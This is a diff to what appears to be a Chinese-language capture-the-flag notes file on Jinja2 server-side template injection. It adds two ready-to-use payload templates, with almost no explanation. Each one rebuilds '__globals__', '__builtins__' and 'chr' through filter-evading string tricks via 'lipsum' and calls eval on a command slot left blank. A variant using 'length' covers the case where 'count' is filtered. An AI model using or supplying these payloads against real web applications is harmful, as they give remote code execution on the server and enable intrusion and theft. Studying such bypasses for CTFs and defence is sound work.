@@ -296,3 +296,57 @@ for i in nums:
     cmd = cmd.replace(f"{i}",f"({patnum[:-1]})|int")
 print(cmd)
 ```
+替换下面的cmd
+```
+{%set e=dict(a=a)|join|count%}
+{%set ee=dict(aa=a)|join|count%}
+{%set eee=dict(aaa=a)|join|count%}
+{%set eeee=dict(aaaa=a)|join|count%}
+{%set eeeee=dict(aaaaa=a)|join|count%}
+{%set eeeeee=dict(aaaaaa=a)|join|count%}
+{%set eeeeeee=dict(aaaaaaa=a)|join|count%}
+{%set eeeeeeee=dict(aaaaaaaa=a)|join|count%}
+{%set eeeeeeeee=dict(aaaaaaaaa=a)|join|count%}
+{%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|count%}
+{%set x=(()|select|string|list).pop((ee~eeee)|int)%}
+{%set glob = (x,x,dict(globals=a)|join,x,x)|join %}
+{%set builtins=x~x~(dict(builtins=a)|join)~x~x%}
+{%set import=x~x~(dict(import=a)|join)~x~x%}
+{%set c = dict(chr=a)|join%}
+{%set o = dict(o=a,s=a)|join%}
+{%set getitem = x~x~(dict(getitem=a)|join)~x~x%}
+{%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%}
+{%set zero=chr((eeee~eeeeeeee)|int)%}
+{%set cmd = 
+%}
+{%if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)%}
+eastjun
+{%endif%}
+```
+如果过滤count，替换成下面
+```
+{%set e=dict(a=a)|join|length%}
+{%set ee=dict(aa=a)|join|length%}
+{%set eee=dict(aaa=a)|join|length%}
+{%set eeee=dict(aaaa=a)|join|length%}
+{%set eeeee=dict(aaaaa=a)|join|length%}
+{%set eeeeee=dict(aaaaaa=a)|join|length%}
+{%set eeeeeee=dict(aaaaaaa=a)|join|length%}
+{%set eeeeeeee=dict(aaaaaaaa=a)|join|length%}
+{%set eeeeeeeee=dict(aaaaaaaaa=a)|join|length%}
+{%set eeeeeeeeee=dict(aaaaaaaaaa=a)|join|length%}
+{%set x=(()|select|string|list).pop((ee~eeee)|int)%}
+{%set glob = (x,x,dict(globals=a)|join,x,x)|join %}
+{%set builtins=x~x~(dict(builtins=a)|join)~x~x%}
+{%set import=x~x~(dict(import=a)|join)~x~x%}
+{%set c = dict(chr=a)|join%}
+{%set o = dict(o=a,s=a)|join%}
+{%set getitem = x~x~(dict(getitem=a)|join)~x~x%}
+{%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%}
+{%set zero=chr((eeee~eeeeeeee)|int)%}
+{%set cmd = 
+%}
+{%if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)%}
+eastjun
+{%endif%}
+```
